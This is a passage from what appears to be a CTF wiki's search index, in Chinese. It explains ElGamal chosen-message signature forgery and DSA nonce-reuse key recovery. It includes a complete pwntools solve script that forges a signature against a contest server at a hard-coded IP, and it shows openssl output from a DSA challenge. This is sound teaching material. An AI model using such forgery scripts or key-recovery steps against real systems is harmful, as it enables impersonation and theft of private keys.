\u90a3\u4e48\u6b64\u65f6\u751f\u6210\u7684\u7b7e\u540d\u4e0e\u6d88\u606f\u5c31\u662f\u53ef\u4ee5\u88ab\u6b63\u5e38\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5177\u4f53\u63a8\u5bfc\u5982\u4e0b  y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p  \u53c8\u7531\u4e8e\u6d88\u606fm\u7684\u6784\u9020\u65b9\u5f0f\uff0c\u6240\u4ee5   \ng^{si} \\equiv g^m \\bmod p-1  \ng^{si} \\equiv g^m \\bmod p-1   \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\u7684\u6d88\u606f\uff0c\u4f46\u662f\u4ed6\u5374\u65e0\u6cd5\u4f2a\u9020\u6307\u5b9a\u683c\u5f0f\u7684\u6d88\u606f\u3002\u800c\u4e14\uff0c\u4e00\u65e6\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u64cd\u4f5c\uff0c\u8fd9\u4e00\u653b\u51fb\u5c31\u4e0d\u518d\u53ef\u884c\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_11", 
            "text": "\u53c2\u8003pdf\u3002", 
            "title": "\u5df2\u77e5\u7b7e\u540d\u4f2a\u9020"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_12", 
            "text": "", 
            "title": "\u9009\u62e9\u7b7e\u540d\u4f2a\u9020"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_13", 
            "text": "\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u6211\u4eec\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f97\u5230\u7b7e\u540d\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u65b0\u7684\u4f46\u662f\u6211\u4eec\u4e0d\u80fd\u591f\u9009\u62e9\u7b7e\u540d\u7684\u6d88\u606f\u4f2a\u9020\u7b7e\u540d\u3002", 
            "title": "\u653b\u51fb\u6761\u4ef6"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_14", 
            "text": "\u6211\u4eec\u77e5\u9053\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u5982\u4e0b  g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p    \u90a3\u4e48\u53ea\u8981\u6211\u4eec\u9009\u62e9\u4e00\u4e2a\u6d88\u606fm\u4f7f\u5176\u548c\u6211\u4eec\u6240\u8981\u4f2a\u9020\u7684\u6d88\u606fm\u2018\u6a21p-1\u540c\u4f59\uff0c\u7136\u540e\u540c\u65f6\u4f7f\u7528\u6d88\u606fm\u7684\u7b7e\u540d\u5373\u53ef\u7ed5\u8fc7\u3002", 
            "title": "\u653b\u51fb\u539f\u7406"
        }, 
        {
            "location": "/crypto/signature/elgamal/#_15", 
            "text": "\u8fd9\u91cc\u4ee52017\u5e74\u56fd\u8d5bmailbox\u4e3a\u4f8b\uff0c i\u6625\u79cb\u6709\u590d\u73b0 \u3002  \u9996\u5148\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u8fdb\u884cproof of work       proof   =   b64 . b64encode ( os . urandom ( 12 )) \n     req . sendall ( \n         Please provide your proof of work, a sha1 sum ending in 16 bit s set to 0, it must be of length  %d  bytes, starting with  %s \\n   %   ( \n         len ( proof )   +   5 ,   proof )) \n\n     test   =   req . recv ( 21 ) \n     ha   =   hashlib . sha1 () \n     ha . update ( test ) \n\n     if   ( test [ 0 : 16 ]   !=   proof   or   ord ( ha . digest ()[ - 1 ])   !=   0   or   ord ( ha . digest ()[ - 2 ])   !=   0 ):   # or ord(ha.digest()[-3]) != 0 or ord(ha.digest()[-4]) != 0): \n         req . sendall ( Check failed ) \n         req . close () \n         return   \n\u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a\u4ee5proof\u5f00\u5934\u7684\u957f\u5ea6\u4e3aproof\u957f\u5ea6\u52a05\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5176sha1\u7684\u503c\u4ee516\u6bd4\u7279\u76840\u7ed3\u675f\u3002  \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7\u3002  def   f ( x ): \n     return   sha1 ( prefix   +   x ) . digest ()[ - 2 :]   ==   \\0\\0  sh   =   remote ( 106.75.66.195 ,   40001 )  # bypass proof  sh . recvuntil ( starting with  )  prefix   =   sh . recvuntil ( \\n ,   drop = True )  print   string . ascii_letters  s   =   util . iters . mbruteforce ( f ,   string . ascii_letters   +   string . digits ,   5 ,   fixed )  test   =   prefix   +   s  sh . sendline ( test )   \u8fd9\u91cc\u4f7f\u7528\u4e86pwntools\u4e2d\u7684util.iters.mbruteforce\uff0c\u8fd9\u662f\u4e00\u4e2a\u5229\u7528\u7ed9\u5b9a\u5b57\u7b26\u96c6\u5408\u4ee5\u53ca\u6307\u5b9a\u957f\u5ea6\u8fdb\u884c\u591a\u7ebf\u7a0b\u7206\u7834\u7684\u51fd\u6570\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7206\u7834\u51fd\u6570\uff0c\u8fd9\u91cc\u662fsha1\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u96c6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5b57\u8282\u6570\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u6307\u7684\u662f\u6211\u4eec\u53ea\u5c1d\u8bd5\u5b57\u8282\u6570\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u5b57\u8282\u6570\u7684\u6392\u5217\uff0c\u5373\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\u3002\u66f4\u52a0\u5177\u4f53\u7684\u4fe1\u606f\u8bf7\u53c2\u8003pwntools\u3002  \u7ed5\u8fc7\u4e4b\u540e\uff0c\u6211\u4eec\u7ee7\u7eed\u5206\u6790\u7a0b\u5e8f\uff0c\u7b80\u5355\u770b\u4e0bgenerate_keys\u51fd\u6570\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u51fd\u6570\u662fElGamal\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u770b\u4e86\u770bverify\u51fd\u6570\uff0c\u5c31\u662f\u9a8c\u8bc1\u7b7e\u540d\u7684\u8fc7\u7a0b\u3002  \u7ee7\u7eed\u5206\u6790               if   len ( msg )     MSGLENGTH : \n                 req . sendall ( what r u do in? ) \n                 req . close () \n                 return \n             if   msg [: 4 ]   ==   test : \n                 r ,   s   =   sign ( digitalize ( msg ),   sk ,   pk ,   p ,   g ) \n                 req . sendall ( Your signature is   +   repr (( hex ( r ),   hex ( s )))   +   \\n ) \n             else : \n                 if   msg   ==   Th3_bery_un1que1i_ChArmIng_G3nji   +   test : \n                     req . sendall ( Signature: ) \n                     sig   =   self . rfile . readline () . strip () \n                     if   len ( sig )     MSGLENGTH : \n                         req . sendall ( what r u do in? ) \n                         req . close () \n                         return \n                     sig_rs   =   sig . split ( , ) \n                     if   len ( sig_rs )     2 : \n                         req . sendall ( yo what? ) \n                         req . close () \n                         return \n                     # print  Got sig , sig_rs \n                     if   verify ( digitalize ( msg ),   int ( sig_rs [ 0 ]),   int ( sig_rs [ 1 ]),   pk ,   p ,   g ): \n                         req . sendall ( Login Success. \\n Dr. Ziegler has a message for you:    +   FLAG ) \n                         print   shipped flag \n                         req . close () \n                         return \n                     else : \n                         req . sendall ( You are not the Genji I knew! \\n )   \u6839\u636e\u8fd9\u4e09\u4e2aif\u6761\u4ef6\u53ef\u4ee5\u77e5\u9053   \u6211\u4eec\u7684\u6d88\u606f\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7MSGLENGTH\uff0c40000\u3002  \u6211\u4eec\u53ef\u4ee5\u5bf9\u6d88\u606f\u5f00\u5934\u4e3atest\u7684\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\u3002  \u6211\u4eec\u9700\u8981\u4f7f\u5f97\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\uff0c\u4ee5\u6211\u4eec\u7ed5\u8fc7proof\u7684test\u4e3a\u7ed3\u5c3e\u7684\u6d88\u606f\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u63d0\u4f9b\u7b7e\u540d\u7684\u503c\u3002   \u5206\u6790\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u5c31\u77e5\u9053\u4e86\uff0c\u6211\u4eec\u5c31\u662f\u5728\u9009\u62e9\u6307\u5b9a\u7b7e\u540d\u8fdb\u884c\u4f2a\u9020\uff0c\u8fd9\u91cc\u6211\u4eec\u81ea\u7136\u8981\u5145\u5206\u5229\u7528\u7b2c\u4e8c\u4e2aif\u6761\u4ef6\uff0c\u53ea\u8981\u6211\u4eec\u786e\u4fdd\u6211\u4eec\u8f93\u5165\u7684\u6d88\u606f\u7684\u5f00\u5934\u4e3a\u2018test\u2019\uff0c\u5e76\u4e14\u8be5\u6d88\u606f\u4e0e\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u6a21p-1\u540c\u4f59\uff0c\u6211\u4eec\u5373\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002  \u90a3\u6211\u4eec\u5982\u4f55\u6784\u9020\u5462\uff1f\u65e2\u7136\u6d88\u606f\u7684\u957f\u5ea6\u53ef\u4ee5\u8db3\u591f\u957f\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5c06'test'\u5bf9\u5e94\u768416\u8fdb\u5236\u5148\u5de6\u79fb\u5f97\u5230\u6bd4p-1\u5927\u7684\u6570\u5b57a\uff0c\u7136\u540e\u7528a\u5bf9p-1\u53d6\u6a21\uff0c\u7528a\u518d\u51cf\u53bb\u4f59\u6570\uff0c\u6b64\u65f6a\u6a21p-1\u4f590\u4e86\u3002\u8fd9\u65f6\u518d\u52a0\u4e0a\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u7684\u503c\uff0c\u5373\u5b9e\u73b0\u4e86\u6a21p-1\u540c\u4f59\u3002  \u5177\u4f53\u5982\u4e0b  # construct the message begins with  test  target   =   Th3_bery_un1que1i_ChArmIng_G3nji   +   test  part1   =   ( digitalize ( test   +   os . urandom ( 51 ))     512 )   //   ( p   -   1 )   *   ( p   -   1 )  victim   =   part1   +   digitalize ( target )  while   1 : \n     tmp   =   hex ( victim )[ 2 :] . decode ( hex ) \n     if   tmp . startswith ( test )   and   \\n   not   in   tmp : \n         break \n     else : \n         part1   =   ( digitalize ( test   +   os . urandom ( 51 ))     512 )   //   ( p   -   1 )   *   ( \n             p   -   1 ) \n         victim   =   part1   +   digitalize ( target )   \u6700\u540e\u7684\u811a\u672c\u5982\u4e0b  from   pwn   import   *  from   hashlib   import   sha1  import   string  import   ast  import   os  import   binascii  context . log_level   =   debug  def   f ( x ): \n     return   sha1 ( prefix   +   x ) . digest ()[ - 2 :]   ==   \\0\\0  def   digitalize ( m ): \n     return   int ( m . encode ( hex ),   16 )  sh   =   remote ( 106.75.66.195 ,   40001 )  # bypass proof  sh . recvuntil ( starting with  )  prefix   =   sh . recvuntil ( \\n ,   drop = True )  print   string . ascii_letters  s   =   util . iters . mbruteforce ( f ,   string . ascii_letters   +   string . digits ,   5 ,   fixed )  test   =   prefix   +   s  sh . sendline ( test )  sh . recvuntil ( Current PK we are using:  )  pubkey   =   ast . literal_eval ( sh . recvuntil ( \\n ,   drop = True ))  p   =   pubkey [ 0 ]  g   =   pubkey [ 1 ]  pk   =   pubkey [ 2 ]  # construct the message begins with  test  target   =   Th3_bery_un1que1i_ChArmIng_G3nji   +   test  part1   =   ( digitalize ( test   +   os . urandom ( 51 ))     512 )   //   ( p   -   1 )   *   ( p   -   1 )  victim   =   part1   +   digitalize ( target )  while   1 : \n     tmp   =   hex ( victim )[ 2 :] . decode ( hex ) \n     if   tmp . startswith ( test )   and   \\n   not   in   tmp : \n         break \n     else : \n         part1   =   ( digitalize ( test   +   os . urandom ( 51 ))     512 )   //   ( p   -   1 )   *   ( \n             p   -   1 ) \n         victim   =   part1   +   digitalize ( target )  assert   ( victim   %   ( p   -   1 )   ==   digitalize ( target )   %   ( p   -   1 ))  # get victim signature  sh . sendline ( hex ( victim )[ 2 :] . decode ( hex ))  sh . recvuntil ( Your signature is )  sig   =   ast . literal_eval ( sh . recvuntil ( \\n ,   drop = True ))  sig   =   [ int ( sig [ 0 ],   0 ),   int ( sig [ 1 ],   0 )]  # get flag  sh . sendline ( target )  sh . sendline ( str ( sig [ 0 ])   +   ,   +   str ( sig [ 1 ]))  sh . interactive ()   \u8fd9\u91cc\u8fd8\u8981\u8bf4\u51e0\u4e2a\u6709\u610f\u601d\u7684\u70b9\u5c31\u662f   int(x,0)\u53ea\u7684\u662f\u5c06x\u6309\u7167\u5176\u5b57\u9762\u5bf9\u5e94\u7684\u8fdb\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4int('0x12',0)=18\uff0c\u8fd9\u91cc\u76f8\u5e94\u7684\u5b57\u9762\u5fc5\u987b\u6709\u5bf9\u5e94\u6807\u5fd7\u5f00\u5934\uff0c\u6bd4\u5982\u8bf4\u5341\u516d\u8fdb\u5236\u662f0x,8\u8fdb\u5236\u662f0\uff0c\u4e8c\u8fdb\u5236\u662f0b\u3002\u56e0\u4e3a\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u5c31\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u8bc6\u522b\u4e86\u3002  python(python2) \u91cc\u9762\u5230\u5e95\u591a\u5927\u7684\u6570\uff0c\u8ba1\u7b97\u51fa\u6765\u6700\u540e\u624d\u4f1a\u5e26\u6709L\u5462\uff1f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5927\u4e8eint\u90fd\u4f1a\u6709L\u3002\u4f46\u662f\u8fd9\u4e2a\u91cc\u9762\u7684victim\u786e\u5b9e\u662f\u6ca1\u6709\u7684\uff0c\uff0c  \u4e00\u4e2a\u95ee\u9898\uff0c\u5f85\u89e3\u51b3\u3002\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/crypto/signature/dsa/", 
            "text": "DSA\n\n\n\u4e0a\u9762\u6240\u63cf\u8ff0\u7684ElGamal\u7b7e\u540d\u7b97\u6cd5\u5728\u5b9e\u9645\u4e2d\u5e76\u4e0d\u5e38\u7528\uff0c\u66f4\u5e38\u7528\u7684\u662f\u5176\u53d8\u4f53DSA\u3002\n\n\n\u57fa\u672c\u539f\u7406\n\n\n\u5bc6\u94a5\u751f\u6210\n\n\n\n\n\u9009\u62e9\u4e00\u4e2a\u5408\u9002\u7684\u54c8\u5e0c\u51fd\u6570\uff0c\u76ee\u524d\u4e00\u822c\u9009\u62e9SHA1\uff0c\u5f53\u524d\u4e5f\u53ef\u4ee5\u9009\u62e9\u5f3a\u5ea6\u66f4\u9ad8\u7684\u54c8\u5e0c\u51fd\u6570H\u3002\n\n\n\u9009\u62e9\u5bc6\u94a5\u7684\u957f\u5ea6L\u548cN\uff0c\u8fd9\u4e24\u4e2a\u503c\u51b3\u5b9a\u4e86\u7b7e\u540d\u7684\u5b89\u5168\u7a0b\u5ea6\u3002\u5728\u6700\u521d\u7684DSS\uff08\nDigital Signature Standard\n \uff09\u4e2d\u5efa\u8baeL\u5fc5\u987b\u4e3a64\u7684\u500d\u6570\uff0c\u5e76\u4e14\n512 \\leq L \\leq 1024\n512 \\leq L \\leq 1024\n \uff0c\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u66f4\u5927\u3002N\u5fc5\u987b\u5927\u5c0f\u5fc5\u987b\u4e0d\u5927\u4e8e\u54c8\u5e0c\u51fd\u6570H\u8f93\u51fa\u7684\u957f\u5ea6\u3002FIPS 186-3\u7ed9\u51fa\u4e86\u4e00\u4e9b\u5efa\u8bae\u7684L\u548cN\u7684\u53d6\u503c\u4f8b\u5b50\uff1a(1024, 160)\uff0c (2048, 224)\uff0c (2048, 256)\uff0c\u4ee5\u53ca (3,072, 256)\u3002\n\n\n\u9009\u62e9N\u6bd4\u7279\u7684\u7d20\u6570q\u3002\n\n\n\u9009\u62e9L\u6bd4\u7279\u7684\u7d20\u6570p\uff0c\u4f7f\u5f97p-1\u662fq\u7684\u500d\u6570\u3002\n\n\n\u9009\u62e9\u6ee1\u8db3\ng^k \\equiv 1 \\bmod p\ng^k \\equiv 1 \\bmod p\n \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u7684g\uff0c\u5373\u5728\u6a21p\u7684\u80cc\u666f\u4e0b\uff0cord(g)=q\u7684g\u3002\u5373g\u5728\u6a21p\u7684\u610f\u4e49\u4e0b\uff0c\u5176\u6307\u6570\u6b21\u5e42\u53ef\u4ee5\u751f\u6210\u5177\u6709q\u4e2a\u5143\u7d20\u7684\u5b50\u7fa4\u3002\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8ba1\u7b97\ng=h^{\\frac{p-1}{q}} \\bmod p\ng=h^{\\frac{p-1}{q}} \\bmod p\n \u6765\u5f97\u5230g\uff0c\u5176\u4e2d\n1\n h \n p-1\n1< h < p-1\n \u3002\n\n\n\u9009\u62e9\u79c1\u94a5x\uff0c\n0\nx\nq\n0<x<q\n \uff0c\u8ba1\u7b97\ny \\equiv g^x \\bmod p\ny \\equiv g^x \\bmod p\n \u3002\n\n\n\n\n\u516c\u94a5\u4e3a(p,q,g,y)\uff0c\u79c1\u94a5\u4e3a(x)\u3002\n\n\n\u7b7e\u540d\n\n\n\u7b7e\u540d\u6b65\u9aa4\u5982\u4e0b\n\n\n\n\n\u9009\u62e9\u968f\u673a\u6574\u6570\u6570k\u4f5c\u4e3a\u4e34\u65f6\u5bc6\u94a5\uff0c\n0\nk\nq\n0<k<q\n \u3002\n\n\n\u8ba1\u7b97\nr\\equiv (g^k \\bmod p) \\bmod q\nr\\equiv (g^k \\bmod p) \\bmod q\n\n\n\u8ba1\u7b97\ns\\equiv (H(m)+xr)k^{-1} \\bmod q\ns\\equiv (H(m)+xr)k^{-1} \\bmod q\n\n\n\n\n\u7b7e\u540d\u7ed3\u679c\u4e3a(r,s)\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u4e0eElgamal\u5f88\u91cd\u8981\u7684\u4e0d\u540c\u662f\u8fd9\u91cc\u4f7f\u7528\u4e86\u54c8\u5e0c\u51fd\u6570\u5bf9\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u5904\u7406\u3002\n\n\n\u9a8c\u8bc1\n\n\n\u9a8c\u8bc1\u8fc7\u7a0b\u5982\u4e0b\n\n\n\n\n\u8ba1\u7b97\u8f85\u52a9\u503c\uff0c\nw=s^{-1} \\bmod q\nw=s^{-1} \\bmod q\n\n\n\u8ba1\u7b97\u8f85\u52a9\u503c\uff0c\nu_1=H(m)w \\bmod q\nu_1=H(m)w \\bmod q\n\n\n\u8ba1\u7b97\u8f85\u52a9\u503c\uff0c\nu_2=rw \\bmod q\nu_2=rw \\bmod q\n\n\n\u8ba1\u7b97\nv=(g^{u_1}y^{u_2} \\bmod p) \\bmod q\nv=(g^{u_1}y^{u_2} \\bmod p) \\bmod q\n\n\n\u5982\u679cv\u4e0er\u76f8\u7b49\uff0c\u5219\u6821\u9a8c\u6210\u529f\u3002\n\n\n\n\n\u6b63\u786e\u6027\u63a8\u5bfc\n\n\n\u9996\u5148\uff0cg \u6ee1\u8db3 \ng^k \\equiv 1 \\bmod p\ng^k \\equiv 1 \\bmod p\n \u7684\u6700\u5c0f\u6b63\u6574\u6570k\u4e3aq\u3002\u6240\u4ee5 \ng^q \\equiv 1 \\bmod p\ng^q \\equiv 1 \\bmod p\n  \u3002\u6240\u4ee5 \ng^x \\equiv g^{x \\bmod q} \\bmod p\ng^x \\equiv g^{x \\bmod q} \\bmod p\n \u3002\u8fdb\u800c\n\n\nv=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw}\nv=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw}\n\n\n\u53c8\ns\\equiv (H(m)+xr)k^{-1} \\bmod q\ns\\equiv (H(m)+xr)k^{-1} \\bmod q\n \u4e14\nw=s^{-1} \\bmod q\nw=s^{-1} \\bmod q\n \u6240\u4ee5\n\n\nk \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q\nk \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q\n\n\n\u6240\u4ee5\nv \\equiv g^k\nv \\equiv g^k\n \u3002\u6b63\u786e\u6027\u5f97\u8bc1\u3002\n\n\n\u5b89\u5168\u6027\n\n\n\u5df2\u77e5k\n\n\n\u539f\u7406\n\n\n\u5982\u679c\u77e5\u9053\u4e86\u968f\u673a\u5bc6\u94a5k\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6839\u636e\ns\\equiv (H(m)+xr)k^{-1} \\bmod q\ns\\equiv (H(m)+xr)k^{-1} \\bmod q\n \u8ba1\u7b97\u79c1\u94a5d\uff0c\u51e0\u4e4e\u653b\u7834\u4e86DSA\u3002\n\n\n\u8fd9\u91cc\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6d88\u606f\u7684hash\u503c\u90fd\u4f1a\u7ed9\u51fa\u3002\n\n\nx \\equiv r^{-1}(ks-H(m)) \\bmod q\nx \\equiv r^{-1}(ks-H(m)) \\bmod q\n\n\nk\u5171\u4eab\n\n\n\u539f\u7406\n\n\n\u5982\u679c\u5728\u4e24\u6b21\u7b7e\u540d\u7684\u8fc7\u7a0b\u4e2d\u5171\u4eab\u4e86k\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u653b\u51fb\u3002\n\n\n\u5047\u8bbe\u7b7e\u540d\u7684\u6d88\u606f\u4e3am1,m2\uff0c\u663e\u7136\uff0c\u4e24\u8005\u7684r\u7684\u503c\u4e00\u6837\uff0c\u6b64\u5916\n\n\ns_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q\ns_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q\n\n\ns_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q\ns_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q\n\n\n\u8fd9\u91cc\u6211\u4eec\u9664\u4e86x\u548ck\u4e0d\u77e5\u9053\u5269\u4e0b\u7684\u5747\u77e5\u9053\uff0c\u90a3\u4e48\n\n\ns_1k \\equiv H(m_1)+xr\ns_1k \\equiv H(m_1)+xr\n\n\ns_2k \\equiv H(m_2)+xr\ns_2k \\equiv H(m_2)+xr\n\n\n\u4e24\u5f0f\u76f8\u51cf\n\n\nk(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q\nk(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q\n\n\n\u6b64\u65f6 \u5373\u53ef\u89e3\u51fak\uff0c\u8fdb\u4e00\u6b65\u6211\u4eec\u53ef\u4ee5\u89e3\u51fax\u3002\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5\u6e56\u6e58\u676f\u7684DSA\u4e3a\u4f8b\uff0c\u4f46\u662f\u4e0d\u80fd\u76f4\u63a5\u53bb\u505a\uff0c\uff0c\uff0c\u56e0\u4e3a\u53d1\u73b0\u5728\u9a8c\u8bc1message4\u7684\u65f6\u5019\u7b7e\u540d\u4e0d\u901a\u8fc7\u3002\u6e90\u9898\u76ee\u6211\u6ca1\u6709\u4e86\uff0c\u3002\uff0c\uff0c\u8fd9\u91cc\u6211\u4ee5Jarvis OJ\u4e2d\u7ecf\u8fc7\u4fee\u6539\u7684\u9898\u76eeDSA\u4e3a\u4f8b\n\n\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin  packet1/message1  \nVerified OK\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin  packet2/message1 \npacket2/message1: No such file or directory\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin  packet2/message2 \nVerified OK\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin  packet3/message3 \nVerified OK\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin  packet4/message4\nVerified OK\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u56db\u5219\u6d88\u606f\u5168\u90e8\u6821\u9a8c\u901a\u8fc7\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u4f1a\u8054\u60f3\u5230\u5171\u4eabk\u662f\u56e0\u4e3a\u9898\u76ee\u4e2d\u63d0\u793a\u4e86PS3\u7684\u7834\u89e3\u66fe\u7528\u5230\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u4ece\u7f51\u4e0a\u641c\u7d22\u53ef\u77e5\u8be5\u653b\u51fb\u3002\n\n\n\u4e0b\u9762\uff0c\u6211\u4eec\u770b\u4e00\u4e0b\u7b7e\u540d\u540e\u7684\u503c\uff0c\u8fd9\u91cc\u4f7f\u7528\u7684\u547d\u4ee4\u5982\u4e0b\n\n\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl asn1parse -inform der -in packet4/sign4.bin  \n    \n0\n:d\n=\n0\n  \nhl\n=\n2\n \nl\n=\n  \n44\n cons: SEQUENCE          \n    \n2\n:d\n=\n1\n  \nhl\n=\n2\n \nl\n=\n  \n20\n prim: INTEGER           :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n   \n24\n:d\n=\n1\n  \nhl\n=\n2\n \nl\n=\n  \n20\n prim: INTEGER           :5E10DED084203CCBCEC3356A2CA02FF318FD4123\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl asn1parse -inform der -in packet3/sign3.bin  \n    \n0\n:d\n=\n0\n  \nhl\n=\n2\n \nl\n=\n  \n44\n cons: SEQUENCE          \n    \n2\n:d\n=\n1\n  \nhl\n=\n2\n \nl\n=\n  \n20\n prim: INTEGER           :5090DA81FEDE048D706D80E0AC47701E5A9EF1CC\n   \n24\n:d\n=\n1\n  \nhl\n=\n2\n \nl\n=\n  \n20\n prim: INTEGER           :30EB88E6A4BFB1B16728A974210AE4E41B42677D\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl asn1parse -inform der -in packet2/sign2.bin  \n    \n0\n:d\n=\n0\n  \nhl\n=\n2\n \nl\n=\n  \n44\n cons: SEQUENCE          \n    \n2\n:d\n=\n1\n  \nhl\n=\n2\n \nl\n=\n  \n20\n prim: INTEGER           :60B9F2A5BA689B802942D667ED5D1EED066C5A7F\n   \n24\n:d\n=\n1\n  \nhl\n=\n2\n \nl\n=\n  \n20\n prim: INTEGER           :3DC8921BA26B514F4D991A85482750E0225A15B5\n\u279c  \n2016\n\u6e56\u6e58\u676fDSA git:\n(\nmaster\n)\n \u2717 openssl asn1parse -inform der -in packet1/sign1.bin  \n    \n0\n:d\n=\n0\n  \nhl\n=\n2\n \nl\n=\n  \n45\n cons: SEQUENCE          \n    \n2\n:d\n=\n1\n  \nhl\n=\n2\n \nl\n=\n  \n21\n prim: INTEGER           :8158B477C5AA033D650596E93653C730D26BA409\n   \n25\n:d\n=\n1\n  \nhl\n=\n2\n \nl\n=\n  \n20\n prim: INTEGER           